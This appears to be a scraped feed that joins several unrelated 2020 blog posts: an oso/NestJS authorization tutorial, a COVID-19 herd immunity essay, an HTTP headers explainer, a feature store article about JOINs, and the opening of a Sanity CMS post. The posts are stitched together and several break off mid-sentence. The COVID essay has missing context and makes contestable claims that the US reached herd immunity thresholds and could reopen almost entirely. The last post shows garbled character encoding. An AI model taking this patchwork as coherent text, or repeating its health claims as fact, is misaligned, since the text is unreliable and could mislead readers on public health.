<p>Probably at this point, you think <em>“How on Earth was this possible in one day”</em>?</p>

October 23, 2020 | https://www.osohq.com/post/adding-authorization-nodejs-app-beyond-role-based-access-control | <a href="https://web.archive.org/web/*/https://www.osohq.com/post/adding-authorization-nodejs-app-beyond-role-based-access-control">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>I regularly hold office hours where I speak with users about problems they're coming up against in auth. Following a recent conversation, the engineer I spoke with and I built a demo app using <a href="https://nestjs.com/">NestJS</a> (a JavaScript web framework) and oso to mock up how access control would work in his company's core application.</p>
<p>I thought I'd share the demo app, which uses several common patterns –&nbsp;e.g., roles, hierarchies, and attributes –&nbsp;as well as how to make oso work in a web framework. In this post, we will show:</p>
<ul>
<li>How to use the oso Node.js library</li>
<li>How to represent common access control patterns in using Polar, the oso policy language</li>
<li>What a declarative approach to policy code looks like</li>
</ul>
<h2><strong>Install and run the demo</strong></h2>
<p>The demo app is <a href="https://github.com/osohq/oso-nest-demo">available on GitHub</a> and contains a <a href="https://github.com/osohq/oso-nest-demo/blob/master/README.md">step-by-step tutorial</a> that explains how the app works and provides the details of the oso implementation.</p>
<p>The app is a document management system. Users can create, read, update, and delete Documents if they have the proper authorization. Documents are grouped into Projects. Users can be members of projects, or can even be Guests to the system (i.e., unauthenticated altogether).</p>
<p>The authorization spec is written using Polar and is organized in two files 1) <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/oso/roles.polar">roles.polar</a>, which defines roles and their relationships; and 2) <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/oso/permissions.polar">permissions.polar</a>, which defines the rules by which users acquire roles and the access privileges each role is granted.</p>
<p>To see the specifics of how we implemented the demo app and used the oso Node.js library, I would encourage you to run through the tutorial and crack open the code. For the rest of this post, let's focus on how we implement the demo's authorization spec in Polar.</p>
<h2><strong>Roles and authentication in the app code</strong></h2>
<p>The demo app has three roles: "owner", "member", and "guest".</p>
<p>The app's <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/document/document.controller.ts">DocumentController</a> uses a class decorator to put a <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/auth/basic-auth.guard.ts">BasicAuthGuard</a> and <code>OsoGuard</code> on all of its request-handling methods:</p>
<pre><code>@UseGuards(BasicAuthGuard, OsoGuard, OsoInstance)
@Controller('document')
@Resource('Document')
export class DocumentController {
</code></pre>

<p>The authentication guard tries to resolve a User object based on credentials in the Request and, if successful, puts that authenticated User object in Request.user. Otherwise, the user defaults to being a Guest user.</p>
<h2><strong>Roles and authorization in oso</strong></h2>
<p>Authentication-based access control is a good first line of defense, but we'll use oso for finer-grained authorization via the class-scoped <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/oso/oso-instance.ts"><code>OsoInstance</code></a>, the method-scoped <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/oso/oso.guard.ts"><code>OsoGuard</code></a>, and the parameter-scoped <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/oso/oso.guard.ts#L34"><code>@Authorize</code></a> decorations used in the <code>DocumentController</code>.</p>
<p>For example, the <a href="https://github.com/osohq/oso-nest-demo/blob/main/src/oso/oso.guard.ts#L34"><code>@Authorize</code></a> parameter provides an authorize() function used inside the controller methods to authorize access to a particular resource. One such usage is in the findOne method, to determine whether the target document can be read by the current user.</p>
<pre><code>@Get(':id')
async findOne(@Param("id") id: string, @Authorize() authorize: any): ... {
  const document = await this.documentService.findOne(Number.parseInt(id));
  await authorize(document);
  return document ? new FindDocumentDto(document) : undefined;
}
</code></pre>

<h2><strong>Role definitions</strong></h2>
<p>Roles are defined in roles.polar. If there is a Guest object in Request.user, the visitor is granted the "guest" role:</p>
<pre><code># The "Guest" actor has "guest" role
role(_guest: Guest, "guest", _document: Document);
</code></pre>

<p>Here, a User is granted the "owner" role for a Document if their user id matches the Document's ownerId:</p>
<pre><code>role(user: User, "owner", document: Document) if
    document.ownerId = user.id;
</code></pre>

<p>Users can also be project owners/members, and a User's role for a Document is inherited from their role for the Project:</p>
<pre><code>## Document roles from project roles
# User has a role for an document if they have the same
# role for the project
role(user: User, role, document: Document) if
    role(user, role, document.project);
</code></pre>

<p>Here, further roles are inherited based on earlier role definitions:</p>
<pre><code>## Role inheritance. Owner &gt; Member &gt; Guest

# User is a member of a Document if they are an owner of that Document
role(user: User, "member", document: Document) if
    role(user, "owner", document);
</code></pre>

<h2><strong>Role-based access control</strong></h2>
<p>Using <a href="https://docs.osohq.com/using/examples/rbac.html">role-based access control (RBAC)</a>, we allow or deny access to read or write documents based on a user's role. The following rules express role-based privileges:</p>
<p>Allow any authenticated user to create a document:</p>
<pre><code>allow(_user: User, "create", "Document");
</code></pre>

<p>Allow a user to read a document if they are a member of that document:</p>
<pre><code>allow(user: User, "read", document: Document) if
    role(user, "member", document);
</code></pre>

<p>Allow a user to delete a document if they are the owner of that document:</p>
<pre><code>allow(user: User, "delete", document: Document) if
    role(user, "owner", document);
</code></pre>

<h2><strong>Why role-based access control isn't enough</strong></h2>
<p>For some of the rules we want to express, role-based access works well. But it doesn't always let us express all the scenarios we need in our app.</p>
<p>For example, the engineer I met with during office hours wanted to be able give customers the ability to restrict view access to documents by setting a ‘members-only' flag. That is, a document would be visible to everyone unless it had that flag, in which case only members could view it..</p>
<p>Here, statically assigning roles to particular users isn't enough. We need a way of dynamically checking access based on attributes of the user and the resource (i.e., the document) in question. This is <a href="https://docs.osohq.com/using/examples/abac.html">attribute-based access control (ABAC)</a>.</p>
<p>Without changing any application code, we can add a three-line policy to express this condition.</p>
<p>The below rule says that any Guest can read a Document if the <em>document</em> does not have the 'members_only' condition:</p>
<pre><code>allow(user: Guest, "read", document: Document) if
    role(user, "guest", document)
    and not members_only(document);
</code></pre>

<p>Actually, this isn't the first time we've used attributes. We used them in prior examples to define roles -- i.e. we identified the "owner" role of a document based on matching the user.ownerId and document.id attributes. But in this most recent case, we're going a step further and using the attributes to make finer-grained access control decisions, which is a big step up over what this might look like if we were to try to do it in the application:</p>
<pre><code>function authorize(user: User, project: Project, document: Document, action: Action): boolean {
  const role: Role = getRoleForDocument(user, document);
  switch (action) {
    case Action.Create:
      if (role == Role.Guest) {
        return false
      } else if (role == Role.Owner || role == Role.Admin) {
        return true
      } else if (project == null) {
        return false
      } else if (project.getMembers().has(user.id)) {
        return true
      }
      break;
    case Action.Read:
      return (role == Role.Guest &amp;&amp; !document.membersOnly) || role != Role.Guest;
    case Action.Update:
      return role != Role.Guest;
    case Action.Delete:
      return role == Role.Owner || role == Role.Admin;
    default:
      return false
  }
}
</code></pre>

<p>While a toy example like this might be reasonably manageable in app code, it's not hard to imagine the logic getting significantly messier as new role and action relationships bloom over the life of the application.</p>
<h2><strong>Extensibility and separation of concerns</strong></h2>
<p>One advantage of separating authorization concerns from business logic is being able to modify or extend authorization policy without changing any application code. For example, let's say we want to add the notion of an "organization" where members of the organization have the same privileges as members of the document or project. In two lines of Polar, we can extend the role a user has in an organization and all of its privileges to documents:</p>
<pre><code># User has a role for a project if they have the same
# role for the organization
role(user: User, role, project: Project) if
    role(user, role, project.organization());
</code></pre>

<p>And since document roles already inherit from project roles, we are done!</p>
<h2><strong>New roles, new rules</strong></h2>
<p>As an app evolves, and its entity relationships grow more complex, extensibility and a clean abstraction for this kind of logic becomes especially useful.</p>
<p>If, for example, we need to add support for external parties to have limited access to documents, we don't need to change any controller logic or examine if statements in our application codebase. We can implement it by synthesizing a new "external" role in our policy code.</p>
<pre><code>role(user: User, "external", project: Project) if
    project.isMember(user.id)
    and user.isExternal

allow(user, action, document: Document) if
    role(user, "external", document)
    and document_action(action, "read");
</code></pre>

<p>In two stanzas, we've created a new role type and only granted read access to Document, as suitable for an external party like an SEO consultant.</p>
<h2><strong>Conclusion</strong></h2>
<p>We now have 10 rules: to check for whether a User is a guest, owns a document, or owns a project; to give certain users the ability to read, edit and delete documents; to give external parties a way to access documents; and more. These are declarative rules that the engineer can express and add as they come up, without having to rationalize or explicitly describe the combinations of the various policies and their potential outcomes. Under the surface, oso searches through the declared rules using inferences and backtracking to find whether there exists a set of satisfied conditions to evaluate to true.</p>
<p>This is one way that declarative approaches can be especially useful – you just express what you want the outcome to be.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<div id="speakaboutWrapper"><p>      Part of the confusion around herd immunity and it’s role in designing policy for the <a href="https://realscience.community/wiki/covid-19-pandemic/" target="_blank" title="From Wikipedia, the free encyclopedia. COVID‑19 pandemicConfirmed cases per 100,000 population as of 8 August 2020&nbsp;&nbsp;>3,000&nbsp;&nbsp;1,000–3,000&nbsp;&nbsp;300–1,000&nbsp;&nbsp;100–300&nbsp;&nbsp;30–100&nbsp;&nbsp;0–30&nbsp;&nbsp;None or no dataCases per countryDeaths per capitaClockwise, starting from top:A nurse caring for a COVID‑19 patient in an&nbsp;intensive care&nbsp;unit aboard a U.S. hospital shipDisinfection vehicles in TaiwanDonated medical supplies being received in the PhilippinesBurial in IranThe&nbsp;Italian government's outbreak task…">COVID-19 pandemic</a> has been understanding the actual definition of herd immunity. It has been misconstrued or oversimplified in a harmful way by the media and even by some experts. The herd immunity threshold (HIT) is the percent of a population that is required to be immune in order for COVID cases to start to decrease, and it’s dependent on human social connectivity. The more people that the average person comes into contact with, and the more likely that that contact will result in an infection, the faster the spread and the higher the herd immunity threshold. The HIT will be different in crowded cities vs. farm lands and in different cultures and age groups. Cultures who greet each other with hugs and kisses (such as France and Italy), for instance, will have faster spread than cultures that don’t touch when greeting (Japan). Therefore “kissy cultures” will require a greater proportion of people to be immune than “non-kissy cultures” to control spread. </p>



<p>  That is, unless they do something to change their behavior. Mask wearing and social distancing change the rate of spread of COVID through communities and thus lower the herd immunity threshold. Closing businesses, schools, and crowded indoor spaces also lowers HIT by making it less likely that people will get close enough to very many other people to contract COVID.  Social connectivity is built right into the basic epidemiological model, the SIR model, in a variable called Beta. According to the Wikipedia article on SIR models (screen shot below), <strong>&nbsp;</strong>β is defined as “average number of contacts per person per time, multiplied by the probability of disease transmission in a contact between a susceptible and an infectious subject”.</p>



<figure><img loading="lazy" width="1024" height="236" src="https://realscience.community/wp-content/uploads/2020/10/image-1024x236.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/10/image-1024x236.png 1024w, https://realscience.community/wp-content/uploads/2020/10/image-300x69.png 300w, https://realscience.community/wp-content/uploads/2020/10/image-768x177.png 768w, https://realscience.community/wp-content/uploads/2020/10/image-1536x354.png 1536w, https://realscience.community/wp-content/uploads/2020/10/image-2048x471.png 2048w, https://realscience.community/wp-content/uploads/2020/10/image-1200x276.png 1200w, https://realscience.community/wp-content/uploads/2020/10/image-1400x322.png 1400w, https://realscience.community/wp-content/uploads/2020/10/image-960x221.png 960w, https://realscience.community/wp-content/uploads/2020/10/image-2000x460.png 2000w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>The translation of this is, the more socially connected people are and the more likely they are to breath on each other and pass along COVID, the higher the Beta. If people are socially distanced and masked, they will be less likely to spread COVID even if they see the same number of people as in the case of open restaurants that have distancing and mask requirements. This is important because Beta is one component of R0, a variable that many people are familiar with. The higher the Beta, the higher the R0. </p>

<p>  So all of this is to explain a key point, the herd immunity threshold is not a constant, it changes with social connectivity. This is actually really good news because it means that with behavioral interventions such as masks and distancing, we can slow viral spread and reach the herd immunity threshold (for that level of openness) with less people actually getting infected and dying, all the while keeping at least some aspects of the economy open. The US has actually reached a herd immunity threshold (for the level of openness) twice now, once during our partial lockdown in late March and April and again at the end of the Summer. Below are daily new cases in the US over time- the arrows show the first two herd immunity thresholds. </p>



<figure><img loading="lazy" width="1024" height="677" src="https://realscience.community/wp-content/uploads/2020/10/image-1-1024x677.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/10/image-1-1024x677.png 1024w, https://realscience.community/wp-content/uploads/2020/10/image-1-300x198.png 300w, https://realscience.community/wp-content/uploads/2020/10/image-1-768x508.png 768w, https://realscience.community/wp-content/uploads/2020/10/image-1-1200x793.png 1200w, https://realscience.community/wp-content/uploads/2020/10/image-1-907x600.png 907w, https://realscience.community/wp-content/uploads/2020/10/image-1-960x635.png 960w, https://realscience.community/wp-content/uploads/2020/10/image-1.png 1458w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>  What many experts are calling herd immunity is the percent immunity needed to slow spread in a place that is completely open without behavior changes. For COVID-19, this threshold has been estimated at ~67% of the population being immune based on data early in the pandemic in France. There are many reasons why this is just a guess and why it might be different over time or in different places. For one thing, people know about COVID now and this definitely has changed their behavior. For another thing, France is a “kissy culture” and thus one likely to spread COVID faster than some other places. Although, I doubt French people are as likely to kiss each other now after all these months of a pandemic. So it’s likely that the herd immunity threshold now is lower in France than it was at the beginning of the pandemic. </p>



<p>  So is the US close to reaching the next herd immunity threshold (for this level of openness)? Yes, actually we are. 45% of North Dakota has been infected for instance. I created the map below to show estimates of percent immunity per state. But remember, the HIT is actually just the percent of immune people required to have cases not spike. So despite ND being at 45%, it’s cases are actually continuing to rise during this current level of openness- so it is not at herd immunity at this time. This is in part due to their reluctance to impose a mask mandate and the giant super spreader event, the Sturgis motorcycle rally. ND may actually be spreading COVID faster (and have a greater R0) than France was in the beginning of the Pandemic. </p>

They are at 36% and 27% immune, respectively. </strong></p>

New Yorkers are at least partially wearing masks, businesses are requiring them, and schools are partially open. In Florida, the only thing not open is indoor bars I believe, and mask wearing is scorned and spotty at best. <strong>So this is a huge piece of information- herd immunity at 36% and 27% is possible under almost completely open circumstances. And 27% immunity is a level that many states are at or rapidly approaching in the US. So therefore, we could be almost entirely open AND not increase cases with some smart planning. </strong></p>



<p>  Some other states are not faring as well this time around. Which states those are was totally predictable (and indeed I did predict this)- at least if you understand herd immunity. As immunity levels go up, the amount of openness can go up without spiking cases. So states that aren’t very immune but have opened up a lot- like opening schools (crowded indoor spaces ie. super spreader environments), will see huge spikes in cases. In the US, this is the midwest and pacific northwest. See Ohio below for example. It’s at 16% and seeing a giant spike. </p>



<figure><img loading="lazy" width="1024" height="882" src="https://realscience.community/wp-content/uploads/2020/10/image-5-1024x882.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/10/image-5-1024x882.png 1024w, https://realscience.community/wp-content/uploads/2020/10/image-5-300x258.png 300w, https://realscience.community/wp-content/uploads/2020/10/image-5-768x662.png 768w, https://realscience.community/wp-content/uploads/2020/10/image-5-1200x1034.png 1200w, https://realscience.community/wp-content/uploads/2020/10/image-5-696x600.png 696w, https://realscience.community/wp-content/uploads/2020/10/image-5-960x827.png 960w, https://realscience.community/wp-content/uploads/2020/10/image-5.png 1279w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>So what can we do with this information? For one thing, the level of openness to not spread COVID can be determined empirically from the percent immunity of a state, the number of active cases, and the willingness to follow mask mandates and other safety guidelines. People can use this information to determine whether it’s safe to send their kids to school and politicians can use it to determine what level of re-opening they should be enacting. This should also put the mask debate to rest– wear a mask– keep your business open and don’t spread COVID. My analysis of mask mandates showed that they related to less COVID cases in the US with a p-value of 10-16. So they work. </p>



<p>    The converse of this is that some states could be more open than they are. There are real harmful effects of being shut down, on the economy, jobs, and people’s mental health. New York, for instance, could have been this open without spiking since late April. Think how many jobs could have been saved and how much better NYC residents would feel right now. I should make the caveat, though, that this type of evaluation needs to be done on at least a county level, because even within states there are areas that are more or less immune. </p>



<p>  Lastly, I hope it has become clear that herd immunity is a value that changes with social connectivity and behavior. It is actually a good reason to wear masks and social distance. It is not a strategy. But it could be very useful in designing a strategy that is nuanced and saves the most lives while keeping the economy as open as possible. It could be used to create a win-win strategy that I believe most people would be ok with. It can also be used to predict people’s level of risk for activities in a particular county. The risk is not uniform in the US or even in any state. The more real, trustworthy information that people have to make decisions, the more empowered they will be over their own health. We need to understand and embrace the nuance in the <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia.

October 23, 2020 | https://www.lorenzweiss.de/the_power_of_http_headers_with_four_examples/ | <a href="https://web.archive.org/web/*/https://www.lorenzweiss.de/the_power_of_http_headers_with_four_examples/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Almost everything in the web is sent with <strong>http</strong> and even non-developers have seen it when using the internet as keyword
inside urls or links.</p>
<p>Http stands for <strong>Hypertext Transfer Protocol</strong> and gives us the ability to transfer hypertext between a browser and a server.
This is a great technology that has been around almost since the invention of the web and is constantly evolving and
<a href="https://en.wikipedia.org/wiki/HTTP/2">offering more and more great features</a></p>

<p>As a developer you probably heard of http headers, at least in the moment you heard about the CORS policy.
This is a problem you must have heard about when developing websites.
But what exactly are http headers and what other ways are there to use them?</p>
<p>Let us first find out what they do and how you could use them. </p>
<p>When a browser requests a resource, for example a page of this blog, it asks the server with a request.
This request looks something like this: </p>
<div data-language="js"><pre><code><span>fetch</span><span>(</span><span>"https://www.lorenzweiss.de/race_conditions_explained/"</span><span>,</span> <span>{</span>
  credentials<span>:</span> <span>"include"</span><span>,</span>
  headers<span>:</span> <span>{</span>
    accept<span>:</span>
      <span>"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span><span>,</span>
    <span>"accept-language"</span><span>:</span> <span>"en,en-US;q=0.9,de-DE;q=0.8,de;q=0.7"</span><span>,</span>
    <span>"cache-control"</span><span>:</span> <span>"max-age=0"</span><span>,</span>
    <span>"sec-fetch-mode"</span><span>:</span> <span>"navigate"</span><span>,</span>
    <span>"sec-fetch-site"</span><span>:</span> <span>"same-origin"</span><span>,</span>
    <span>"sec-fetch-user"</span><span>:</span> <span>"?1"</span><span>,</span>
    <span>"upgrade-insecure-requests"</span><span>:</span> <span>"1"</span><span>,</span>
  <span>}</span><span>,</span>
  referrerPolicy<span>:</span> <span>"no-referrer-when-downgrade"</span><span>,</span>
  body<span>:</span> <span>null</span><span>,</span>
  method<span>:</span> <span>"GET"</span><span>,</span>
  mode<span>:</span> <span>"cors"</span><span>,</span>
<span>}</span><span>)</span><span>;</span></code></pre></div>
<p>So you can see the URL or location of the resource, some information about the request and also a lot of headers with some information about the request.
This is how your browser tells the server some more information about the request. For example what kind of data type it accepts or
how the client is handling the cache.</p>
<p>After sending the request, the server replies, and it also sets some headers in the reply, which could look like this: </p>
<div data-language="text"><pre><code>:authority: www.lorenzweiss.de
:method: GET
:path: /race_conditions_explained/
:scheme: https
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
accept-encoding: gzip, deflate, br
accept-language: en,en-US;q=0.9,de-DE;q=0.8,de;q=0.7
cache-control: max-age=0
cookie: _ga=GA1.2.1173972759.1584812492; _gid=GA1.2.2076192721.1594044231
sec-fetch-mode: navigate
sec-fetch-site: same-origin
sec-fetch-user: ?1
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36</code></pre></div>
<p>There is also some information that the server wants to tell the browser what to do with the resource, for example
if there are cookies, it must be determined which encoding was used, etc</p>
<p>Basically, in the http-context the headers for the communication of the browser and the server are used to extend the simple
Requests for resources. You could see it as the sheet of paper that is added on top of a package that you oder from an online store,
giving you more information about the context and the resource that you ordered.
Most of the headers have quite good defaults which you don't need to think of, but there are some headers that
can get quite important, like CORS headers. But there are so much more headers that you might never heard of which are very useful
and good to know how to use. </p>

<p>Do not worry, this article will not deal with CORS headers. The following http headers are those that are rarely used, but
can be really powerful and helpful to significantly improve the communication between a server and the browser. </p>
<p>So let's dig into it. Here are some headers that you can set and that are very useful and practical.</p>
<h2 id="if-range"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/If-Range">If-Range</a><a href="#if-range" aria-label="if range permalink"></a></h2>
<h3>What and why?</h3>
<p>Imagine you start downloading a large resource, such as a video, an image, etc., and stop in between because of connection problems.
With <code>If-Range</code> you can tell the server if the representation is unchanged, to send the part(s) that are requested in Range.
Which means only the parts that were missing and not again the whole thing.</p>
<p>This can be very helpful when dealing with large resources and often bad connections as with mobile devices.
Because the resource can be downloaded in parts even if the connection is interrupted in between. </p>
<h4>How to use</h4>
<p>It can either be used with a date when the resources were last modified, or with an <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag">ETag</a>, which is a key to help if the resources was invalidated</p>
<div data-language="text"><pre><code>If-Range: &lt;day-name&gt;, &lt;day&gt; &lt;month&gt; &lt;year&gt; &lt;hour&gt;:&lt;minute&gt;:&lt;second&gt; GMT
If-Range: &lt;etag&gt;</code></pre></div>
<h4>Example</h4>
<div data-language="text"><pre><code>If-Range: Wed, 21 Oct 2015 07:28:00 GMT </code></pre></div>
<h2 id="vary"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Vary">Vary</a><a href="#vary" aria-label="vary permalink"></a></h2>
<p><code>Vary</code> Comes from a time when the web or http was used for a variety of things and not just for web pages.<br>
It is based on the idea of using http to exchange information in many different formats.
How does it do that? Well, it tells the server in which header to find the information, how to present the information. </p>
<p>Nowadays it can be really helpful if you have different resources for different customers, for example
mobile, tablet or desktop.
Imagine three different images for the same resource are stored on the server, depending on the device.
Then you can simply use the <code>Vary</code> header to tell the server to check the device and then decide which image size to send. </p>
<h4>Example</h4>
<p>For the example with the device dependent images, you can simply pass the 'user agent' to tell the server
that it should check the user-agent for device information. </p>

<h4>How to use</h4>

<p>Just enter the header, the server must check before deciding which resource to send.</p>
<h2 id="content-disposition"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Content-Disposition">Content-Disposition</a><a href="#content-disposition" aria-label="content disposition permalink"></a></h2>
<p>If we go back to the example of a request to a server, for example to load this website, it is clear to the browser,
that it must <strong>display</strong> the resource of the answer.
But it can also be the case that the server sends a resource that the browser should automatically download to the user's computer,
like a picture or pdf etc.
A server can tell the browser what the browser should do with the attached resource via the <code>Content Disposition</code> header.</p>
<h4>Example</h4>
<p>With defining the <code>Content-disposition</code> to <code>attachment</code> the browser knows that this is a resource to download instead of just
show. </p>
<div data-language="text"><pre><code>Content-Disposition: attachment; filename="data.pdf"</code></pre></div>
<h4>How to use</h4>
<p>You can define the header as <code>inline</code> or <code>attachment</code>, where `inline is always the default.  </p>
<div data-language="text"><pre><code>Content-Disposition: &lt;inline | attachment&gt;</code></pre></div>
<h2 id="feature-policy"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Feature-Policy">Feature-Policy</a><a href="#feature-policy" aria-label="feature policy permalink"></a></h2>
<p>This is a fairly new header and therefore only supported by modern browsers (sorry to all IE users). However
I want to mention this anyway because I think it can be really helpful for some use cases.<br>
Basically, the <code>feature-policy tells the browser which features or apis the browser should provide to the document and its</code>iframes` to be used. </p>
<p>For example, it can ban all scripts or iframes etc. within this website to allow sensitive apis like the camera or microphone.</p>
<h4>How to use</h4>
<div data-language="text"><pre><code>Feature-Policy: &lt;directive&gt; &lt;allowlist&gt;</code></pre></div>
<p>The <code>directive</code> is the name of the feature. You can see the full <a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Feature-Policy#Directives">list of features here</a>
The <code>allowlist</code> defines the origins which are allowed to use the directive.</p>
<h3>Example</h3>
<p>Suppose we want our website to use neither the microphone nor the camera. With this header the
document or a contained iframe cannot access these functions.</p>
<div data-language="text"><pre><code>Feature-Policy: microphone 'none'; camera 'none'</code></pre></div>
<h3>More Headers:</h3>
<p>Here are some more headers that are worth mentioning: </p>
<ul>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Upgrade-Insecure-Requests">Upgrade-Insecure-Requests</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Age">Age</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Trailer">Trailer</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Location">Location</a></li>
</ul>
<h2 id="conclusion">Conclusion<a href="#conclusion" aria-label="conclusion permalink"></a></h2>
<p>Https headers are great and also very useful! But sometimes they can be quite complex, and it's really hard to get an overview of what headers are available and what benefits they bring.
Also when developing a website, especially in the frontend, you don't come in contact with them too often, except maybe with the CORS headers.
But I think that this missed some possibilities. http headers represent the communication between the server and the
customers much better, and we all know that communication is the key to a good relationship.</p>
<p>I hope I could shed some light on the darkness of http headers for you. In case I missed a good and helpful header,
please do not hesitate to send me a mail or contact me in any way.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><p>TLDR; Many engineers conflate operational Feature Stores with key-value (KV) stores, like DynamoDB and Cassandra. In fact, KV stores are missing a key mechanism needed to make features reusable: JOINs. JOINs enable features to be reused by different models. This blog is about how to scale your ML infrastructure by reusing cached features so that the number of feature pipelines you manage does not grow linearly with the number of models you run in production.</p><figure id="w-node-6837f843508c-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92f4e94a9b1084ab992187_twitter.jpg" loading="lazy" alt=""></p><figcaption><a href="https://odsc.com/speakers/from-silos-to-platform-building-twitters-feature-marketplace/">Img from OSDC talk by Twitter</a>. Twitter evaluate their Feature Store by the number of features that are reused across teams.</figcaption></figure><h2>The Cost of No JOINs: One Feature Pipeline per Model</h2><p>If you don’t reuse features across different models, you will need a new feature pipeline for every new model you put in production. In the diagram below, there is a 1:1 mapping between train/test datasets and models. For every new model you put in production, you will write a new feature pipeline from your data stores that transforms and validates the raw data and performs aggregations, materializing train/test data to files. A ML training program (or pipeline) then trains and validates a model with the train/test data, after which it is tested and deployed to production.</p><p>It is very difficult to reuse the features in the materialized train/test datasets, as they tend to be stored in a format specific to a ML framework: .tfrecord for TensorFlow,.npy for PyTorch - and they cannot be easily combined with features stored in other train/test datasets. This is often due to the limitations of the file formats: neither TFRecord nor NPY support projections (selecting just a subset of columns).</p><p>If you intend to run hundreds of models in production, running hundreds of pipelines will explode your technical debt.</p><figure id="w-node-5b746662ee67-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92ea783652dae4e198dca1_pic-01re.jpg" loading="lazy" alt=""></p></figure><p>In online feature stores that do not support JOINs, it is typically the responsibility of the application to perform the JOIN of the cached features to create the feature vector. So, if you build your own online feature store using Cassandra or DynamoDB, you will need to also add logic for joining (and ordering) features in your applications/models.&nbsp;</p><p>Every new feature you add to that model will need an update to the feature pipeline and changes to the application logic - making it costly and potentially cross-team work.</p><figure id="w-node-0abcd444357c-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eaa4cc8f44bbcc4cb4ad_pic-02re.jpg" loading="lazy" alt=""></p></figure><h2>JOINs enable Feature Reuse</h2><figure id="w-node-792e5aca9095-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eac165896f1612cb3dea_pic-03re.jpg" loading="lazy" alt=""></p></figure><p>A JOIN is a Structured Query Language (SQL) command to combine data from two different two database tables. JOINs are used to create a view over the data that originates from one or more tables. If we assume that we store features normalized in database tables, then we are able to create sets of features (training datasets) by selecting different features from different tables and joining them together using a common join key. The join key(s) identify the common entity these feature values represent.&nbsp;</p><p>If we now assume that features are stored as columns in tables, then what is a train/test dataset? It is a set of features along with a target column. Assuming the features are already present in existing tables, we can just join those features (columns) together to create a view - this view is the train/test dataset. The order of features (in a view) that makes up a train/test dataset is significant - a train/test dataset is a <a href="https://www.mathsisfun.com/combinatorics/combinations-permutations.html">permutations of features - not a combination</a>. Views (enabled by JOINs) enable a massive number of train/test datasets to be defined over a small number of shared features (stored in tables)</p><p>In Hopsworks, we store features in tables that we call “Feature Groups”. Feature Groups introduce a level of indirection between the raw input data and the train/test datasets used to train models, see below. They store a cached copy of the features, computed using the same feature pipeline from earlier, but this time, the feature pipeline writes to one or both of the stores that much a feature store: (1) a scalable store for train/test features (offline feature store) and (2) a low latency, high throughput store for features for serving (online feature store).&nbsp;</p><p>In Hopsworks, we use Apache Hive as a scalable database for the offline store, and MySQL Cluster (NDB) as the online store. Our version of Hive stores its metadata in NDB and its data files in HopsFS/S3. In Hopsworks, FeatureGroups are database tables in Hive and MySQL Cluster, along with feature metadata (also tables in the same NDB database).&nbsp;</p><p>As we can see in the diagram below, if we have N features available in the Feature Store, we can create an unlimited number of train/test datasets by simply joining features together from the offline feature store.&nbsp;</p><p>In Hopsworks, we use Spark, with its cost-based optimizer, to perform JOINs. Spark, together with Parquet/Hudi/ORC help optimize joins by supporting partitioned data, push-down projections, SortMergeJoin, and&nbsp;<br></p><ul role="list"><li>a hint;</li><li>a join type (inner, left, outer, etc);</li><li>a join condition (equi-join);</li><li>an estimation of the input data size</li></ul><figure id="w-node-d713661f3233-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eae8333d716893ac2f5a_pic-04re.jpg" loading="lazy" alt=""></p></figure><h2>JOINs in Online Feature Stores</h2><p>If you use a KV store as your online store, you are back in the same situation as at start - you need a feature pipeline for every new model you put in production.

<![CDATA[Powering JavaScript Sites with Sanity CMS and Spirit Fish]]>

October 23, 2020 | https://www.spirit.fish/blog/working-with-sanity | <a href="https://web.archive.org/web/*/https://www.spirit.fish/blog/working-with-sanity">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  

  <div>
    <p>Iâ€™ve said it a few times, but 
      <a target="_blank" href="https://www.sanity.io/">Sanity CMS</a>
 is easily the most futuristic content management system on the planet - with slick editor experience, unique deployable infrastructure, and the introduction of itâ€™s new 
      <a target="_blank" href="https://www.sanity.io/blog/introducing-presence">Presence</a>
